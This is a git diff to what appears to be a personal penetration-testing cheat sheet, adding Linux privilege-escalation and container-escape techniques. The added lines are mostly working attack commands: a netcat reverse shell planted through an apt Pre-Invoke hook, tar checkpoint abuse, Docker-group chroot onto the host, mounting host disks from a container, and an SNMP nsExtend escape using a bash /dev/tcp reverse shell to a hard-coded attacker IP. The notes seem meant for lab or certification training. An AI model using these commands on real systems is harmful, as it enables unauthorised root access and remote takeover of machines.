@@ -163,6 +163,8 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Kernel Exploits](#kernel-exploits)
     - [find with exec](#find-with-exec)
     - [Abusing capabilities](#abusing-capabilities)
+    - [Escape shell](#escape-shell)
+    - [Docker](#docker)
   - [Windows Privilege Escalation](#windows-privilege-escalation)
     - [Resources](#resources-3)
     - [Privileges](#privileges)
@@ -4134,6 +4136,11 @@ Path traversal:
 
 #### <ins>Cron Jobs</ins>
 
+Run:
+- `cat /etc/crontab`, `crontab -l`, `pspy`
+- `grep "CRON" /var/log/syslog`
+- 
+
 **File Permissions**
 - View the contents of the system-wide crontab `cat /etc/crontab`, the cron log file `grep "CRON" /var/log/syslog` and see cron jobs, locate the file run with `locate <program>` and see the permissions with `ls -l <program full path>`
 - If one of them is world-writable, substitute it with the following
@@ -4156,6 +4163,10 @@ Path traversal:
 - run other commands as part of a checkpoint feature
   - `touch /home/user/--checkpoint=1`
   - `touch /home/user/--checkpoint-action=exec=shell.elf`
+
+**apt running as root**
+1. `cd /etc/apt/apt.conf.d/`
+2. `echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.114 1234 >/tmp/f"};' > shell`
 
 #### <ins>SUID / SGID Executables</ins>
 
@@ -4266,6 +4277,53 @@ Path traversal:
   - Search for `cap_setuid+ep`, meaning that setuid capabilities are enabled, effective and permitted
 - Search what you need in [GTFOBins](https://gtfobins.github.io/)
   - Example with Perl: `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
+
+
+#### <ins>Escape shell</ins>
+
+- with tar https://gtfobins.github.io/gtfobins/tar/#shell
+  1. create an sh with a nc command for a reverse shell > name 'exploit.sh'
+  2. touch ./"--checkpoint=1"
+  3. touch ./"--checkpoint-action=exec=bash exploit.sh"
+- https://vk9-sec.com/linux-restricted-shell-bypass/
+
+#### <ins>Docker</ins>
+
+- If your user is part of the 'docker' group
+  - find an image with `docker images`
+  - `docker run -v /:/mnt --rm -it IMAGE chroot /mnt sh`
+
+Escape container
+- If the first thing you see when you get access to the machine is a file `.dockerenv` and the hostname is something like `0873e8062560`, it means that you are in a docker container
+- https://exploit-notes.hdks.org/exploit/container/docker/docker-escape/
+
+Process
+1. List host's disks
+   - `fdisk -l`
+2. Attempt mount `disklo`
+   - `mkdir /tmp/mnt1`
+   - `mount /dev/sda1 /tmp/mnt1`
+   - `cd /tmp/mnt1`
+3. Now you can navigate `sda1` in `/tmp/mnt1`
+- If you find an internal ip / service (maybe with `ifconfig`, `netstat -ano` or `cat /etc/hosts`), try this
+  1. `ssh -l root 172.17.0.2`
+
+Docker Container Escape via SNMP
+- SNMP test
+  1. Look for `.snmpd.conf` (maybe in `/var/backups`)
+     - found community string: `rocommunity 53cur3M0NiT0riNg`
+     - Found NET-SNMP-EXTEND-MIB tables (`nsExtendConfigTable`, `nsExtendOutput1Table` and `nsExtendOutput2Table`) > this means RCE
+  2. `sudo download-mibs`
+  3. `set mibs +ALL in /etc/snmp/snmp.conf`
+  4. `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`
+     - notice if the query works
+- docker escape
+   1. VICTIM:
+      ```
+      echo 'bash -c "bash -i >& /dev/tcp/192.168.45.216/4444 0>&1"' > /tmp/shtest
+      chmod +x /tmp/shtest
+      ```
+   3. ATTACKER: `snmpwalk -v2c -c 53cur3M0NiT0riNg 192.168.190.113 nsExtendOutput1`
 
 ### <ins>Windows Privilege Escalation</ins>
 
